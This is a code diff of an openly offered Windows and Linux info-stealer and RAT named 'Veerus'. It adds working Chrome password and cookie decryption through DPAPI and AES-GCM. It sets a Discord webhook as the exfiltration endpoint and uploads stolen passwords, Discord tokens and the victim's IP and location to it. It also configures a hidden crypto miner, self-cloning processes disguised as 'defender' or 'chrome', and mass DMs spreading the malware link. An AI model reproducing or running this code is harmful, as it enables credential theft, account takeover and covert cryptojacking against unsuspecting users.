@@ -33,6 +33,14 @@ import os
 from http.server import HTTPServer, CGIHTTPRequestHandler
 import tkinter as tk
 import pyImpossibleObf
+import os
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+from datetime import timezone, datetime, timedelta
 
 
 """
@@ -42,7 +50,7 @@ import pyImpossibleObf
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "webhook667"
+chiffre = "https://discord.com/api/webhooks/1009580301812514886/bKV3mU8ZYwj-SHdivqqkIS5ChFi9UeEQSB7MuY8DhRUqZyRjbe4cTFeeiMzR5F09ojPH"
 ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
@@ -50,7 +58,7 @@ CLONE_PROCESS = True # Create Instances of the program hidden in multiple path.
 PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
 PROCESS_NUM = 3 #3 is the perfect number,if you want your program to be un-removable put it a 5 maximum 
 
-MINE = True #Mine crypto? True/False
+MINE = False #Mine crypto? True/False
 
 DMALL_FRIENDS = False #Dm all friends in discord using token.
 DMALL_MSG = ":flag_gb: :\nFÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â»cked by the best virus ever\n\nDiscord grabber\nTelegram session grabber\nChrome/Firefox Cr4d1t c4rds, cookies, autofill, password stealer\nUndetected\nRAT\nHidden Crypto Miner\n\n\nLink : https://github.com/0xSxZ/Veerus \n\nBy 0xSz/0xSxZ" #Leave like that if you want to support the project.
@@ -68,31 +76,31 @@ currency = "=========Stealed by 0xSxZ =============\n\n"
 local_appdata = os.environ['LOCALAPPDATA'] + "\\"
 default_appdata = os.getenv('APPDATA')
 chromiumpaths = [
-	default_appdata + "\\Opera Software\\Opera Stable\\User Data\\Default",
-	default_appdata + "\\Opera Software\\Opera GX Stable\\User Data\\Default",
-	local_appdata + "Google\\Chrome\\User Data\\Default\\Default",
-	local_appdata + "Google(x86)\\Chrome\\User Data\\Default\\Default",
-	local_appdata + "Chromium\\User Data\\Default\\Default",
-	local_appdata + "BraveSoftware\\Brave-Browser\\User Data\\Default",
-	local_appdata + "Epic Privacy Browser\\User Data\\Default",
-	local_appdata + "Amigo\\User Data\\Default",
-	local_appdata + "Vivaldi\\User Data\\Default",
-	local_appdata + "Orbitum\\User Data\\Default",
-	local_appdata + "Mail.Ru\\Atom\\User Data\\Default",
-	local_appdata + "Kometa\\User Data\\Default",
-	local_appdata + "Comodo\\Dragon\\User Data\\Default",
-	local_appdata + "Torch\\User Data\\Default",
-	local_appdata + "Comodo\\User Data\\Default",
-	local_appdata + "Slimjet\\User Data\\Default",
-	local_appdata + "360Browser\\Browser\\User Data\\Default",
-	local_appdata + "Maxthon3\\User Data\\Default",
-	local_appdata + "K-Melon\\User Data\\Default",
-	local_appdata + "Sputnik\\Sputnik\\User Data\\Default",
-	local_appdata + "Nichrome\\User Data\\Default",
-	local_appdata + "CocCoc\\Browser\\User Data\\Default",
-	local_appdata + "uCozMedia\\Uran\\User Data\\Default",
-	local_appdata + "Chromodo\\User Data\\Default",
-	local_appdata + "Yandex\\YandexBrowser\\User Data\\Default"
+	default_appdata + "\\Opera Software\\Opera Stable",
+	default_appdata + "\\Opera Software\\Opera GX Stable",
+	local_appdata + "Google\\Chrome",
+	local_appdata + "Google(x86)\\Chrome",
+	local_appdata + "Chromium",
+	local_appdata + "BraveSoftware\\Brave-Browser",
+	local_appdata + "Epic Privacy Browser",
+	local_appdata + "Amigo",
+	local_appdata + "Vivaldi",
+	local_appdata + "Orbitum",
+	local_appdata + "Mail.Ru\\Atom",
+	local_appdata + "Kometa",
+	local_appdata + "Comodo\\Dragon",
+	local_appdata + "Torch",
+	local_appdata + "Comodo",
+	local_appdata + "Slimjet",
+	local_appdata + "360Browser\\Browser",
+	local_appdata + "Maxthon3",
+	local_appdata + "K-Melon",
+	local_appdata + "Sputnik\\Sputnik",
+	local_appdata + "Nichrome",
+	local_appdata + "CocCoc\\Browser",
+	local_appdata + "uCozMedia\\Uran",
+	local_appdata + "Chromodo",
+	local_appdata + "Yandex\\YandexBrowser"
 ]
 
 yes = "yes"
@@ -110,9 +118,9 @@ if yes == "yes":
 			time.sleep(0.1)
 	#threading.Thread(target=antiAnalysis).start()
 	def valid_uuid(uuid):
-	    regex = re.compile('^[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}\Z', re.I)
-	    match = regex.match(uuid)
-	    return bool(match)
+		 regex = re.compile('^[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}\Z', re.I)
+		 match = regex.match(uuid)
+		 return bool(match)
 	def launchProcesses(path):
 		try:
 			os.system("path")
@@ -191,7 +199,7 @@ if yes == "yes":
 				for i in range(len(chromiumpaths)):
 					if not os.path.exists(chromiumpaths[i]):
 						continue
-					path = str(chromiumpaths[i] + "\\Web Data")
+					path = str(chromiumpaths[i] + "\\User Data\\"+"\\Default\\Web Data")
 
 					shutil.copy(path, "webdata.db")
 					path = "webdata.db"
@@ -236,54 +244,11 @@ if yes == "yes":
 	"""
 
 
-	def get_chrome_datetime(chromedate):
-		"""Return a `datetime.datetime` object from a chrome format datetime
-		Since `chromedate` is formatted as the number of microseconds since January, 1601"""
-		if chromedate != 86400000000 and chromedate:
-			try:
-				return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
-			except Exception as e:
-				print(f"Error: {e}, chromedate: {chromedate}")
-				return chromedate
-		else:
-			return ""
-
-	def get_encryption_key(path):
-		local_state_path = path + "\\Local State"
-		with open(local_state_path, "r", encoding="utf-8") as f:
-			local_state = f.read()
-			local_state = json.loads(local_state)
-
-		# decode the encryption key from Base64
-		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-		# remove 'DPAPI' str
-		key = key[5:]
-		# return decrypted key that was originally encrypted
-		# using a session key derived from current user's logon credentials
-		# doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
-		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-
-	def decrypt_data(data, key):
-		try:
-			# get the initialization vector
-			iv = data[3:15]
-			data = data[15:]
-			# generate cipher
-			cipher = AES.new(key, AES.MODE_GCM, iv)
-			# decrypt password
-			return cipher.decrypt(data)[:-16].decode()
-		except:
-			try:
-				return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
-			except:
-				# not supported
-				return ""
-
 	def chromeCookies():
 		try:
 			chrcooks = ""
 			for i in range(len(chromiumpaths)):
-				db_path = chromiumpaths[i] + "\\Network\\Cookies"
+				db_path = chromiumpaths[i] + "\\User Data\\Default\\Network\\Cookies"
 				print("Getting Chrome cookies : " + db_path)
 				if not os.path.exists(db_path):
 					continue
@@ -297,15 +262,7 @@ if yes == "yes":
 				db.text_factory = lambda b: b.decode(errors="ignore")
 				cursor = db.cursor()
 				# get the cookies from `cookies` table
-				cursor.execute("""
-				SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
-				FROM cookies""")
-				# you can also search by domain, e.g thepythoncode.com
-				# cursor.execute("""
-				# SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
-				# FROM cookies
-				# WHERE host_key like '%thepythoncode.com%'""")
-				# get the AES key
+				cursor.execute("""SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies""")
 				key = get_encryption_key(chromiumpaths[i])
 				for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
 					decrypted_value = decrypt_data(encrypted_value, key)
@@ -316,9 +273,6 @@ if yes == "yes":
 					Host: {host_key}
 					Cookie name: {name}
 					Cookie value (decrypted): {decrypted_value}
-					Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
-					Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
-					Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
 					===============================================================
 					"""
 					# update the cookies table with the decrypted value
@@ -335,6 +289,109 @@ if yes == "yes":
 			return chrcooks
 		except Exception as e:
 			print(e)
+	def chrome_date_and_time(chrome_data):
+
+		# Chrome_data format is 
+		# year-month-date hr:mins:seconds.milliseconds
+		# This will return datetime.datetime Object
+		return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
+
+	def fetching_encryption_key():
+		
+		# Local_computer_directory_path will
+		# look like this below
+		# C: => Users => <Your_Name> => AppData => 
+		# Local => Google => Chrome => User Data => 
+		# Local State
+		
+		local_computer_directory_path = os.path.join(
+		os.environ["USERPROFILE"], "AppData", "Local", "Google",
+		"Chrome", "User Data", "Local State")
+													 
+		with open(local_computer_directory_path, "r", encoding="utf-8") as f:
+			local_state_data = f.read()
+			local_state_data = json.loads(local_state_data)
+
+		# decoding the encryption key using base64
+		encryption_key = base64.b64decode(
+		local_state_data["os_crypt"]["encrypted_key"])
+		
+		# remove Windows Data Protection API (DPAPI) str
+		encryption_key = encryption_key[5:]
+		
+		# return decrypted key
+		return win32crypt.CryptUnprotectData(
+		encryption_key, None, None, None, 0)[1]
+	def password_decryption(password, encryption_key):
+
+		try:
+			iv = password[3:15]
+			password = password[15:]
+			
+			# generate cipher
+			cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
+			
+			# decrypt password
+			return cipher.decrypt(password)[:-16].decode()
+		except:
+			try:
+				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+			except:
+				return "No Passwords"
+	def main():
+		try:
+			binks = ""
+			key = fetching_encryption_key()
+			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+									"Google", "Chrome", "User Data", "default", "Login Data")
+			filename = "ChromePasswords.db"
+			shutil.copyfile(db_path, filename)
+			  
+			# connecting to the database
+			db = sqlite3.connect(filename)
+			cursor = db.cursor()
+			  
+			# 'logins' table has the data
+			cursor.execute(
+				"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
+				"order by date_last_used")
+			  
+			# iterate over all rows
+			for row in cursor.fetchall():
+				main_url = row[0]
+				login_page_url = row[1]
+				user_name = row[2]
+				decrypted_password = password_decryption(row[3], key)
+				date_of_creation = row[4]
+				last_usuage = row[5]
+				  
+				if user_name or decrypted_password:
+					binks = binks + (f"Main URL: {main_url}\n")
+					binks = binks + (f"Login URL: {login_page_url}\n")
+					binks = binks +(f"User name: {user_name}\n")
+					binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
+				  
+				else:
+					continue
+				  
+				if date_of_creation != 86400000000 and date_of_creation:
+					print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
+				  
+				if last_usuage != 86400000000 and last_usuage:
+					print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
+				print("=" * 100)
+			cursor.close()
+			db.close()
+			return(binks)
+			try:
+				  
+				# trying to remove the copied db file as 
+				# well from local computer
+				os.remove(filename)
+			except:
+				pass
+		except Exception as e:
+	  		return e
 	def PasswLinux():
 		try:
 			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
@@ -359,28 +416,6 @@ if yes == "yes":
 		except Exception as e:
 			return "Error  or no passwords. : " + str(e)
 
-	def CookiesLinux():
-		try:
-			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
-			FirefoxPath2 = os.listdir(FirefoxPath)
-			FirefoxLength = len(FirefoxPath2)
-			for i in range(FirefoxLength):
-				if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "/cookies.sqlite")):
-					db = FirefoxPath + FirefoxPath2[i] + "/cookies.sqlite"
-					connection = sqlite3.connect(str(db))
-					cookies = str( tuple(connection.execute("SELECT host FROM moz_cookies"))) + str(dict(connection.execute("SELECT name, value FROM moz_cookies")))
-					connection.close()
-					return (b"""
-	-------------------------
-	Veerus by 0xSz
-	Cookies stealed
-	------------------------\n
-	""" + bytes(str(cookies),encoding='utf-8') +b"\n\n------------------------")
-					break
-				else:
-					print("False")
-		except Exception as e:
-			return chromeCookies()
 
 
 	"""
@@ -516,7 +551,7 @@ if yes == "yes":
 		"huge-pages": true,
 		"hw-aes": null,
 		"log-file": null,
-		"max-cpu-usage": 80,
+		"max-cpu-usage": 50,
 		"pools": [
 			{
 				"url": "rx.unmineable.com:3333",
@@ -548,12 +583,13 @@ if yes == "yes":
 				print("[.] Executing miner..")
 	connectOption()
 	if(chiffre != "" and chiffre != None):
+		print("[.] Sending")
 		webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
 		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
 		webhook.add_embed(embed)
-		webhook.add_file(file=str(CookiesLinux()), filename="0xCookies.txt") 
 		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
-		webhook.add_file(file=PasswWin().replace("{'", "\n\n").replace("},", ""), filename="0xPasswords.txt")
+		print("[.] Password : "+ main())
+		webhook.add_file(file=str(main()), filename="0xPasswords.txt")
 		try:
 			autofill = stealChromeWin()
 			autfill = str(autofill).split(":::667")
